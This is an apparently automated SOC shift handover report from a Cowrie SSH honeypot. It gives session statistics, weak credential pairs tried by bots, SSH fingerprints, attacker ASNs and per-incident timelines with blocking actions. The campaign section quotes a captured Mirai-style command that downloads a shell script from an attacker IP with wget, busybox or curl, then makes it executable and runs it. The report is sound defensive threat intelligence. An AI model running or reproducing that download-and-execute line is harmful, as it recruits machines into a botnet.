# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-24 |
| **Generated At** | 2026-11-24T07:30:31Z |
| **Shift Time** | 07:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **575** |
| Confirmed Threats | **541** |
| False Positives Filtered | **34** (5.9%) |
| Unique Attacker IPs | **497** |
| Countries of Origin | **72** |
| High Severity Cases | **457** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **118** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **946** |
| Unique Credential Pairs | **217** |
| Unique Usernames | **43** |
| Unique Passwords | **177** |
| Successful Auth Pairs | **660** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 178 |
| `admin` | 95 |
| `supervisor` | 89 |
| `support` | 83 |
| `operator` | 64 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 26 |
| `1234` | 18 |
| `asdfgh` | 18 |
| `admin123` | 17 |
| `support` | 16 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 16 |
| `admin` | `admin` | 15 |
| `operator` | `asdfgh` | 12 |
| `root` | `root` | 12 |
| `nobody` | `` | 12 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `supervisor` | `supervisor66` | `10.0.0.73` | 2026-11-24T00:00:44 |
| `test` | `test` | `102.210.148.41` | 2026-11-24T00:00:47 |
| `supervisor` | `123abc` | `10.0.0.73` | 2026-11-24T00:00:51 |
| `support` | `support` | `10.0.0.73` | 2026-11-24T00:01:04 |
| `default` | `alpine` | `102.134.166.131` | 2026-11-24T00:01:05 |
| `default` | `alpine` | `182.76.36.62` | 2026-11-24T00:01:14 |
| `supervisor` | `supervisor4` | `10.0.0.73` | 2026-11-24T00:01:17 |
| `root` | `zxcvbnm` | `10.0.0.73` | 2026-11-24T00:01:19 |
| `guest` | `0987654321` | `124.88.174.143` | 2026-11-24T00:01:40 |
| `ubuntu` | `123456aA@` | `206.189.189.60` | 2026-11-24T00:01:43 |
| `support` | `support12345` | `197.156.97.198` | 2026-11-24T00:01:47 |
| `guest` | `0987654321` | `210.0.90.82` | 2026-11-24T00:01:50 |
| `orangepi` | `orangepi` | `24.45.235.179` | 2026-11-24T00:01:51 |
| `support` | `support12345` | `78.67.161.64` | 2026-11-24T00:01:58 |
| `orangepi` | `orangepi` | `41.207.248.234` | 2026-11-24T00:01:59 |
| `admin` | `1234` | `10.0.0.73` | 2026-11-24T00:02:47 |
| `supervisor` | `P@ssw0rd` | `27.123.113.10` | 2026-11-24T00:02:55 |
| `support` | `support123456` | `10.0.0.73` | 2026-11-24T00:03:09 |
| `nobody` | `nobody123456` | `65.20.131.63` | 2026-11-24T00:03:52 |
| `root` | `Abcd1234` | `37.150.238.6` | 2026-11-24T00:03:52 |
_… 640 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **575** |
| Sessions with Fingerprint | **22** |
| Unique HASSH Fingerprints | **22** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 419 |
| Go SSH scanner | 38 |
| Unknown | 4 |
| PuTTY | 2 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 418 | 392 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 2 |
| `7d01d047ace6...` | Mirai/variant | 8 | 2 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 418 | 392 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 2 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 8 | 2 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 7 | 7 | — |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **14** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **497** |
| Unique ASNs | **150** |
| High-Risk ASNs | **114** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 223 | HIGH |
| `AS4134` | CHINANET BACKBONE | 21 | HIGH |
| `AS4766` | Korea Telecom | 19 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 11 | HIGH |
| `AS22773` | Cox Communications, LLC | 10 | HIGH |
| `AS396982` | Google LLC | 8 | LOW |
| `AS15169` | Google LLC | 6 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (450)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8bb44c0ec544

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]41` |
| **First Seen** | 2026-11-24 00:00 |
| **Last Seen** | 2026-11-24 00:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:00:45` | `cowrie.session.connect` |
| `2026-11-24 00:00:45` | `cowrie.client.version` |
| `2026-11-24 00:00:45` | `cowrie.client.kex` |
| `2026-11-24 00:00:47` | `cowrie.login.success` |
| `2026-11-24 00:00:48` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe7f27fac3b

| Field | Detail |
|---|---|
| **Source IP** | `102.134.166[.]131` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:03` | `cowrie.session.connect` |
| `2026-11-24 00:01:03` | `cowrie.client.version` |
| `2026-11-24 00:01:03` | `cowrie.client.kex` |
| `2026-11-24 00:01:05` | `cowrie.login.success` |
| `2026-11-24 00:01:06` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.134.166[.]131` to AbuseIPDB if not already reported
- [ ] Block `102.134.166[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d38d1ae362c

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:11` | `cowrie.session.connect` |
| `2026-11-24 00:01:12` | `cowrie.client.version` |
| `2026-11-24 00:01:12` | `cowrie.client.kex` |
| `2026-11-24 00:01:14` | `cowrie.login.success` |
| `2026-11-24 00:01:15` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f668191439

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:36` | `cowrie.session.connect` |
| `2026-11-24 00:01:37` | `cowrie.client.version` |
| `2026-11-24 00:01:37` | `cowrie.client.kex` |
| `2026-11-24 00:01:40` | `cowrie.login.success` |
| `2026-11-24 00:01:41` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25b05660aad

| Field | Detail |
|---|---|
| **Source IP** | `206.189.189[.]60` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:43` | `cowrie.session.connect` |
| `2026-11-24 00:01:43` | `cowrie.client.version` |
| `2026-11-24 00:01:43` | `cowrie.client.kex` |
| `2026-11-24 00:01:43` | `cowrie.login.success` |
| `2026-11-24 00:01:44` | `cowrie.session.params` |
| `2026-11-24 00:01:44` | `cowrie.command.input` |
| `2026-11-24 00:01:44` | `cowrie.log.closed` |
| `2026-11-24 00:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.189[.]60` to AbuseIPDB if not already reported
- [ ] Block `206.189.189[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07121914f071

| Field | Detail |
|---|---|
| **Source IP** | `197.156.97[.]198` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:45` | `cowrie.session.connect` |
| `2026-11-24 00:01:46` | `cowrie.client.version` |
| `2026-11-24 00:01:46` | `cowrie.client.kex` |
| `2026-11-24 00:01:47` | `cowrie.login.success` |
| `2026-11-24 00:01:48` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.97[.]198` to AbuseIPDB if not already reported
- [ ] Block `197.156.97[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c8c89e831a

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:47` | `cowrie.session.connect` |
| `2026-11-24 00:01:48` | `cowrie.client.version` |
| `2026-11-24 00:01:48` | `cowrie.client.kex` |
| `2026-11-24 00:01:50` | `cowrie.login.success` |
| `2026-11-24 00:01:50` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a571de466d60

| Field | Detail |
|---|---|
| **Source IP** | `24.45.235[.]179` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:50` | `cowrie.session.connect` |
| `2026-11-24 00:01:50` | `cowrie.client.version` |
| `2026-11-24 00:01:50` | `cowrie.client.kex` |
| `2026-11-24 00:01:51` | `cowrie.login.success` |
| `2026-11-24 00:01:52` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.45.235[.]179` to AbuseIPDB if not already reported
- [ ] Block `24.45.235[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a224b894165a

| Field | Detail |
|---|---|
| **Source IP** | `78.67.161[.]64` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:57` | `cowrie.session.connect` |
| `2026-11-24 00:01:57` | `cowrie.client.version` |
| `2026-11-24 00:01:57` | `cowrie.client.kex` |
| `2026-11-24 00:01:58` | `cowrie.login.success` |
| `2026-11-24 00:01:58` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.67.161[.]64` to AbuseIPDB if not already reported
- [ ] Block `78.67.161[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e345838e51

| Field | Detail |
|---|---|
| **Source IP** | `41.207.248[.]234` |
| **First Seen** | 2026-11-24 00:01 |
| **Last Seen** | 2026-11-24 00:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:01:57` | `cowrie.session.connect` |
| `2026-11-24 00:01:57` | `cowrie.client.version` |
| `2026-11-24 00:01:57` | `cowrie.client.kex` |
| `2026-11-24 00:01:59` | `cowrie.login.success` |
| `2026-11-24 00:01:59` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.207.248[.]234` to AbuseIPDB if not already reported
- [ ] Block `41.207.248[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f49e6a6fba

| Field | Detail |
|---|---|
| **Source IP** | `27.123.113[.]10` |
| **First Seen** | 2026-11-24 00:02 |
| **Last Seen** | 2026-11-24 00:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:02:52` | `cowrie.session.connect` |
| `2026-11-24 00:02:53` | `cowrie.client.version` |
| `2026-11-24 00:02:53` | `cowrie.client.kex` |
| `2026-11-24 00:02:55` | `cowrie.login.success` |
| `2026-11-24 00:02:56` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.123.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `27.123.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ece770a9cc47

| Field | Detail |
|---|---|
| **Source IP** | `37.150.238[.]6` |
| **First Seen** | 2026-11-24 00:03 |
| **Last Seen** | 2026-11-24 00:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:03:50` | `cowrie.session.connect` |
| `2026-11-24 00:03:50` | `cowrie.client.version` |
| `2026-11-24 00:03:50` | `cowrie.client.kex` |
| `2026-11-24 00:03:52` | `cowrie.login.success` |
| `2026-11-24 00:03:52` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.150.238[.]6` to AbuseIPDB if not already reported
- [ ] Block `37.150.238[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c820d01cea9

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-11-24 00:03 |
| **Last Seen** | 2026-11-24 00:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:03:50` | `cowrie.session.connect` |
| `2026-11-24 00:03:50` | `cowrie.client.version` |
| `2026-11-24 00:03:50` | `cowrie.client.kex` |
| `2026-11-24 00:03:52` | `cowrie.login.success` |
| `2026-11-24 00:03:52` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9df2e5c02a0

| Field | Detail |
|---|---|
| **Source IP** | `113.193.187[.]154` |
| **First Seen** | 2026-11-24 00:03 |
| **Last Seen** | 2026-11-24 00:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:03:56` | `cowrie.session.connect` |
| `2026-11-24 00:03:56` | `cowrie.client.version` |
| `2026-11-24 00:03:56` | `cowrie.client.kex` |
| `2026-11-24 00:03:58` | `cowrie.login.success` |
| `2026-11-24 00:03:58` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.187[.]154` to AbuseIPDB if not already reported
- [ ] Block `113.193.187[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320ac57f3f54

| Field | Detail |
|---|---|
| **Source IP** | `45.4.20[.]14` |
| **First Seen** | 2026-11-24 00:03 |
| **Last Seen** | 2026-11-24 00:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:03:58` | `cowrie.session.connect` |
| `2026-11-24 00:03:58` | `cowrie.client.version` |
| `2026-11-24 00:03:58` | `cowrie.client.kex` |
| `2026-11-24 00:04:03` | `cowrie.login.success` |
| `2026-11-24 00:04:04` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.4.20[.]14` to AbuseIPDB if not already reported
- [ ] Block `45.4.20[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac95abc33b0e

| Field | Detail |
|---|---|
| **Source IP** | `70.167.235[.]225` |
| **First Seen** | 2026-11-24 00:04 |
| **Last Seen** | 2026-11-24 00:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:04:01` | `cowrie.session.connect` |
| `2026-11-24 00:04:02` | `cowrie.client.version` |
| `2026-11-24 00:04:02` | `cowrie.client.kex` |
| `2026-11-24 00:04:03` | `cowrie.login.success` |
| `2026-11-24 00:04:03` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.167.235[.]225` to AbuseIPDB if not already reported
- [ ] Block `70.167.235[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a55f4bc4796

| Field | Detail |
|---|---|
| **Source IP** | `121.131.220[.]170` |
| **First Seen** | 2026-11-24 00:04 |
| **Last Seen** | 2026-11-24 00:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:04:04` | `cowrie.session.connect` |
| `2026-11-24 00:04:04` | `cowrie.client.version` |
| `2026-11-24 00:04:04` | `cowrie.client.kex` |
| `2026-11-24 00:04:06` | `cowrie.login.success` |
| `2026-11-24 00:04:07` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.131.220[.]170` to AbuseIPDB if not already reported
- [ ] Block `121.131.220[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1c14ef14b0

| Field | Detail |
|---|---|
| **Source IP** | `212.44.166[.]238` |
| **First Seen** | 2026-11-24 00:05 |
| **Last Seen** | 2026-11-24 00:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:05:49` | `cowrie.session.connect` |
| `2026-11-24 00:05:49` | `cowrie.client.version` |
| `2026-11-24 00:05:49` | `cowrie.client.kex` |
| `2026-11-24 00:05:49` | `cowrie.login.success` |
| `2026-11-24 00:05:50` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.44.166[.]238` to AbuseIPDB if not already reported
- [ ] Block `212.44.166[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bc7247e59e

| Field | Detail |
|---|---|
| **Source IP** | `83.57.96[.]24` |
| **First Seen** | 2026-11-24 00:05 |
| **Last Seen** | 2026-11-24 00:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:05:54` | `cowrie.session.connect` |
| `2026-11-24 00:05:55` | `cowrie.client.version` |
| `2026-11-24 00:05:55` | `cowrie.client.kex` |
| `2026-11-24 00:05:56` | `cowrie.login.success` |
| `2026-11-24 00:05:57` | `cowrie.direct-tcpip.request` |
| `2026-11-24 00:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.57.96[.]24` to AbuseIPDB if not already reported
- [ ] Block `83.57.96[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0561a458bb3

| Field | Detail |
|---|---|
| **Source IP** | `27.32.45[.]104` |
| **First Seen** | 2026-11-24 00:06 |
| **Last Seen** | 2026-11-24 00:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-24 00:06:05` | `cowrie.session.connect` |
| `2026-11-24 00:06:06` | `cowrie.client.version` |
| `2026-11-24 00:06:06` | `cowrie.client.kex` |
